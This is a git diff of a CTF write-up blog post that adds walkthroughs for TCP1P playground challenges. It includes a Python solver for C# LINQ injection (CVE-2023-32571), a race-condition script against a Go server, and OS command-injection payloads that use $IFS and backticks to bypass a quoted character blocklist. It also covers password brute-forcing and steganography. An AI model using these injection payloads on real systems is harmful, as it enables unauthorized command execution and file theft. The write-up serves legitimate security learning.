@@ -1,7 +1,7 @@
 ---
 title: "TCP1P Playground 365"
 date: "2025-02-19"
-description: "Reverse Engineering, Web Exploitation, Forensic, Blockchain Walktrough"
+description: "TCP1P CTF Playground Write-Up"
 categories: [
     "Write-up"
 ]
@@ -642,22 +642,145 @@ app.post('/api/files', express.urlencoded({ extended: true }), (req, res) => {
 TCP1P{path_traversal_using_nullbyte_is_still_happend_in_bun_haha}
 ```
 Flag: ``TCP1P{path_traversal_using_nullbyte_is_still_happend_in_bun_haha}``
-#### make a webex walktrough is make me lazy ngl, ill post again about webex tomorrow ig, lets switch to forensic
+### Library
+##### Author: aimardcr
+##### Desc: Sure sure, you are good at hacking server made using PHP, JavaScript, Python and Java. Now try hack this C# server (>ω<) Flag is located at /flag_<random-uuid>.txt URL: http://playground.tcp1p.team:40279
+we got a web service and source code
+![web service](libraryweb.png)
+
+the source is compiled .NET applications, means we need to decompile it first
+![](librarydecompile.png)
+
+after searching for like a hour, i got information source variable is vuln (CVE-2023-32571), and i got refernce from previous CTF chall from `SekaiCTF` and this is the solver.
+#### Solver
+```py
+import requests
+from urllib.parse import quote_plus
+
+URL = 'http://playground.tcp1p.team:40279'
+
+ch = 'flag_-01234567890abcdef.txt'
+filename = ""
+while not filename.endswith('.txt'):
+    for c in ch:
+        r = requests.get(URL + '/books?searchString=' + quote_plus('Harry") AND "".GetType().Assembly.DefinedTypes.First(x => x.FullName == "System"+"."+"String").DeclaredMethods.Where(x => x.Name == "StartsWith").First().Invoke("".GetType().Assembly.DefinedTypes.First(x => x.FullName == "System.Array").DeclaredMethods.Where(x => x.Name == "GetValue").Skip(1).First().Invoke("".GetType().Assembly.DefinedTypes.First(x => x.FullName == "System.IO.Directory").DeclaredMethods.Where(x => x.Name == "GetFiles").Skip(1).First().Invoke(null, new object[] { "/", "flag*.txt" }), new object[] { 0 }), new object[] { "/'+(filename+c)+'" }).ToString()=="True" AND ("xx"="xx'))
+        if r.status_code == 200 and 'No books found.' not in r.text:
+            filename += c
+            print(filename)
+ch = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}'
+flag = ""
+while not flag.endswith('}'):
+    for c in ch:
+        r = requests.get(URL + '/books?searchString=' + quote_plus('Harry") AND "".GetType().Assembly.DefinedTypes.First(x => x.FullName == "System"+"."+"String").DeclaredMethods.Where(x => x.Name == "StartsWith").First().Invoke("".GetType().Assembly.DefinedTypes.First(x => x.FullName == "System"+".IO."+"File").DeclaredMethods.Where(x => x.Name == "ReadAllText").First().Invoke(null, new object[] { "/'+filename+'" }), new object[] { "' + (flag+c) + '" }).ToString()=="True" AND ("xx"="xx'))
+        if r.status_code == 200 and 'No books found.' not in r.text:
+            flag += c
+            print(flag)
+```
+![](librarysolver.png)
+
+![](libraryflag.png)
+Flag: `INTECHFEST{L1nQ_Inj3cTshio0000nnnnn}`
+### Imposible
+##### Author: Dimas
+##### Desc: It's even possible to solve this challenge? I don't think so.
+##### Hints: maybe what you're missing is the fact that golang using goroutine to handle requests
+so i got a web service made with Golang and the source code
+`main.go`:
+```go
+package main
+
+import (
+	"net/http"
+)
+
+func main() {
+	r := MakeRouter()
+
+	r.UseMiddleware(logMiddleware)
+	r.UseMiddleware(antiXSS)
+	r.UseMiddleware(cspProtection)
+
+	r.Get("/", http.HandlerFunc(indexView))
+
+	r.Get("/flag", adminOnly, http.HandlerFunc(flagHandler))
+
+	http.ListenAndServe(":8080", r)
+}
+```
+path /flag has flag but hidden, and get protected by `adminOnly` middleware
+```go
+func adminOnly(next http.Handler) http.Handler {
+	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		w.WriteHeader(http.StatusUnauthorized)
+	})
+}
+```
+its literally imposible (as the title says) but if we read the hints, it says about goroutine, and i search up about it, and the result is goroutine vuln to race condition, and yea this is the solver
+#### Solver
+```py
+import threading
+import requests
+
+base_url = 'http://playground.tcp1p.team:32783/'
+
+def make_requests(endpoint, thread_id):
+    url = f'{base_url}{endpoint}'
+    response = requests.get(url)
+    if "INTECHFEST" in response.text:
+        print(response.text)
+
+endpoints = ['/', '/flag']
+threads = []
+x = 0
+while x < 100:
+    t = threading.Thread(target=make_requests, args=(endpoints[x%2], x))
+    threads.append(t)
+    t.start()
+    x+=1
+```
+![output](imposibleflag.png)
+Flag: `INTECHFEST{golang_race_condition_is_hard_to_find_bfbbedecec8b}`
+
+### oscommand
+##### Author: 53buahapel
+##### Desc: Flag folder is in / directory. Find a way to get it.restricted: [';', '&', '|', '||', '&&', '>', '<', '(', ')', '{', '}', '[', ']', '\', ''', '"', '!', '*', '?', '~', '#', '%', '+', ' ']
+we i got a web service, and the web service has a ping command on their web system (i know just by see it)
+![](oscommandefaultweb.png)
+
+so yea this is kinda basic, we need just input like this `localhost;ls` to exploit the web, but they blocked some symbol, so we can use $IFS 
+```bash
+localhost$IFS`ls$IFS/`
+```
+![](oscommandlistdir.png)
+
+as you can see, there is secret directory called `sup3rsecr3td1rectory` so just get into it
+```
+localhost$IFS`ls$IFS/sup3rsecr3td1rectory`
+```
+![](oscommandflagtxt.png)
+lets just cat it
+```
+localhost$IFS`cat$IFS/sup3rsecr3td1rectory/flag.txt`
+```
+![](oscommandflag.png)
+Flag: `TCP1P{007150786cd8158d85d4d9445115857a82adc67310b8f78a011b9557dd540593}`
+
 ## Digital Forensic
-#### Audio Images
+### Audio Images
 ###### Author: Orch4th
 ###### Desc: Budi is a vocational school student and a famous hacker in his class and has the mindset that things that exist in the real world can actually also be created in the digital world. Therefore, Budi tried to make a digital dinosaur called Cracknosaurus in the hope that the digital dinosaur he made could rule the world like the ancient dinosaurs of ancient times. Cracknosaurus may look like an ordinary file, but you wouldn't know what Budi is hiding in this really extraordinary cracknosaurus image.
 We got a zip file, but when i want to unzip it, it says `unsupported compression method 99` means its locked, and i try to brute force the password with rockyou
 ![](cracknosaurushash.png)
 and we got the pass, unlock it with 7z
 and we got an image
+
 ![](cracknosaurusimg.png)
 
 then i try to brute force again, but with stegseek (same but faster than john)
 ![](cracknosaurusflag.png)
 Flag: `TCP1P{m4st3r1ng_cr4ck1ng_w1th_r0cky0u!!!}`
 
-#### kuli-ah forensik
+### kuli-ah forensik
 ##### Author: fire
 ##### Desc: I just created secret message in image file but i want to make it secure so i transform it to audio file. But i think it's not secure enough so i archive it with password. I encrypt it with very strong password. I'am sure no one can crack it because my password is random 15 digit number in base 3. It's very very secure right? ... right??. Then i wrap my file within an image so no one can realize. flag = TCF2024{<my secret message>}
 we got an image, as you can see in the desc, it says the imagebhave `strong` pass, the pass is 15 random digit number in base 3, but you know... its not secure as u thought, we can brute force it, but before brute force it, we need to make the wordlist
@@ -674,7 +797,7 @@ open the image
 
 Flag: `TCF2024{w0w_congrats_you_win}`
 
-#### pemanasan
+### pemanasan
 ##### About: fire
 ##### Desc: I just create handmade pdf. Well i also made flag checker inside pdf file. Cool right? 😎
 we got a pdf, when i tried to open it, it has a pass, ye ofc i brute force it with rockyou first
@@ -717,4 +840,18 @@ def decrypt_flag():
 print("Flag:", decrypt_flag())
 ```
 Flag: `TCF2024{mallic1ous_pdf_is_cr4zyy_e1695f085f069fb1ebb2d9df1d013ecb}`
-## LANJUT BESOK NGANTUK
+### Audio Image
+###### Author: Orch4th
+###### Desc: Welcome to the future of explorer, where an image can output audio and audio can also output images. However, the future also has problems, so we hope you can help. The future has a special image about the developer of the future world which has special audio in it, but someone managed to hack the image and change the audio into a hidden message. Help us to track and get special messages from these hackers.
+i got a image, and i got this by accident
+![](audioimagefakeflag.png)
+
+but sadly it was fake flag (lol), and as always if the category is forensic, we can start with `binwalk` first
+![](audioimagebinwalk.png)
+
+as you can see, there is hidden file in the image, and its .wav (audio), we can use foremost to extract it.
+
+when i played the audio, its only weird sound, then i decide to check it with `sonic-visualiser` then adding spectogram.
+
+![](audioimageflag.png)
+Flag: `TCP1P{4nn0y1ng_f0r3ns1cs_1m4g3_4nd_4ud10!!!}`
